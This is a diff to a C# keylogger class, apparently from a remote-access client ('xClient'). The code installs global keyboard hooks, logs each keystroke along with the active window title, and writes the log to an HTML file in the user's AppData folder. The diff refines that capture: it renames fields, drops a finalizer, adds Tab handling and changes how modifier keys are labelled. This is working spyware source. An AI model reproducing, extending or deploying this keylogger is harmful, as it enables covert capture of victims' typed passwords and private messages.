@@ -16,7 +16,7 @@ namespace xClient.Core.Keylogger
         private bool _disposed = false;
 
         private StringBuilder _logFileBuffer;
-        private string _hWndLastTitle;
+        private string _lastWindowTitle;
 
         private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                             "\\Logs\\";
@@ -33,7 +33,7 @@ namespace xClient.Core.Keylogger
         public Logger(double flushInterval)
         {
             Instance = this;
-            _hWndLastTitle = string.Empty;
+            _lastWindowTitle = string.Empty;
 
             WriteFile();
 
@@ -52,16 +52,6 @@ namespace xClient.Core.Keylogger
             // Necessary for setting global hooks because setting a global
             // hook requires an established message pipeline for the thread.
             Application.Run();
-        }
-
-        ~Logger()
-        {
-            // If Dispose() is called, we won't reach here and performance will not be
-            // hit. This is here if Dispose() did not get called when it should have.
-            // It is a safe-guard because we want to make sure we unsubscribe from these
-            // things or the client may not be able to get keystrokes/mouse clicks to any
-            // other application (including Windows).
-            Dispose(false);
         }
 
         public void Dispose()
@@ -131,14 +121,14 @@ namespace xClient.Core.Keylogger
 
         private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
-            string _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
-            if (!string.IsNullOrEmpty(_hWndTitle))
+            string activeWindowTitle = GetActiveWindowTitle(); //Get active thread window title
+            if (!string.IsNullOrEmpty(activeWindowTitle))
             {
                 // Only write the title to the log file if the names are different.
-                if (_hWndTitle != _hWndLastTitle)
+                if (activeWindowTitle != _lastWindowTitle)
                 {
-                    _hWndLastTitle = _hWndTitle;
-                    _logFileBuffer.Append(@"<p class=""h""><br><br>[<i>" + _hWndTitle + "</i>]</p><br>");
+                    _lastWindowTitle = activeWindowTitle;
+                    _logFileBuffer.Append(@"<p class=""h""><br><br>[<i>" + activeWindowTitle + "</i>]</p><br>");
                 }
             }
             // If modifier keys are still down, the key code provided will
@@ -157,23 +147,26 @@ namespace xClient.Core.Keylogger
             }
             else if (e.KeyCode >= Keys.Left && e.KeyCode <= Keys.Down)
             {
-                _logFileBuffer.Append(@"<p class=""h"">(" + e.KeyCode.ToString() + ")</p>");
+                _logFileBuffer.Append(@"<p class=""h"">[" + e.KeyCode.ToString() + "]</p>");
             }
             else
             {
                 switch (e.KeyCode)
                 {
                     case Keys.Enter:
-                        _logFileBuffer.Append(@"<p class=""h"">(ENTER)</p><br>"); //this could be where the KeyloggerKeys enum would be handy
+                        _logFileBuffer.Append(@"<p class=""h"">[Enter]</p><br>"); //this could be where the KeyloggerKeys enum would be handy
                         break;
                     case Keys.Space:
                         _logFileBuffer.Append("&nbsp;");
                         break;
+                    case Keys.Tab:
+                        _logFileBuffer.Append(@"<p class=""h"">[Tab]</p>");
+                        break;
                     case Keys.Back:
-                        _logFileBuffer.Append(@"<p class=""h"">(BACK)</p>");
+                        _logFileBuffer.Append(@"<p class=""h"">[Back]</p>");
                         break;
                     case Keys.Delete:
-                        _logFileBuffer.Append(@"<p class=""h"">(DEL)</p>");
+                        _logFileBuffer.Append(@"<p class=""h"">[Delete]</p>");
                         break;
                     default:
                         {
@@ -235,6 +228,17 @@ namespace xClient.Core.Keylogger
             _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
         }
 
+        private string GetDisplayName(string key)
+        {
+            if (key.Contains("ControlKey"))
+                return "Control";
+            else if (key.Contains("Menu"))
+                return "Alt";
+            else if (key.Contains("Win"))
+                return "Win";
+            return key;
+        }
+
         private string HighlightSpecialKeys(Keys[] keys)
         {
             if (keys.Length < 1) return string.Empty;
@@ -242,7 +246,7 @@ namespace xClient.Core.Keylogger
             string[] names = new string[keys.Length];
             for (int i = 0; i < keys.Length; i++)
             {
-                names[i] = keys[i].ToString();
+                names[i] = GetDisplayName(keys[i].ToString());
             }
 
             if (_pressedKeys.Contains(Keys.LControlKey)
@@ -262,11 +266,11 @@ namespace xClient.Core.Keylogger
                     {
                         if (validSpecialKeys == 0)
                         {
-                            specialKeys.AppendFormat(@"<p class=""h"">([{0}] ", names[i]);
+                            specialKeys.AppendFormat(@"<p class=""h"">[{0}", names[i]);
                         }
                         else
                         {
-                            specialKeys.AppendFormat("+ [{0}]", names[i]);
+                            specialKeys.AppendFormat(" + {0}", names[i]);
                         }
 
                         validSpecialKeys++;
@@ -277,26 +281,24 @@ namespace xClient.Core.Keylogger
                 // font tag and some trailing white-space.
                 if (validSpecialKeys > 0)
                 {
-                    specialKeys.Append(")</p> ");
+                    specialKeys.Append("]</p> ");
                 }
 
                 return specialKeys.ToString();
             }
-            else
+
+            StringBuilder normalKeys = new StringBuilder();
+
+            for (int i = 0; i < names.Length; i++)
             {
-                StringBuilder normalKeys = new StringBuilder();
-
-                for (int i = 0; i < names.Length; i++)
+                _pressedKeys.Remove(keys[i]);
+                if (!string.IsNullOrEmpty(names[i]))
                 {
-                    _pressedKeys.Remove(keys[i]);
-                    if (!string.IsNullOrEmpty(names[i]))
-                    {
-                        normalKeys.Append(names[i]);
-                    }
+                    normalKeys.Append(names[i]);
                 }
-
-                return normalKeys.ToString();
             }
+
+            return normalKeys.ToString();
         }
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
@@ -338,7 +340,7 @@ namespace xClient.Core.Keylogger
                                 if (_logFileBuffer.Length > 0)
                                     sw.Write(_logFileBuffer);
 
-                                _hWndLastTitle = string.Empty;
+                                _lastWindowTitle = string.Empty;
                             }
                             else
                                 sw.Write(_logFileBuffer);
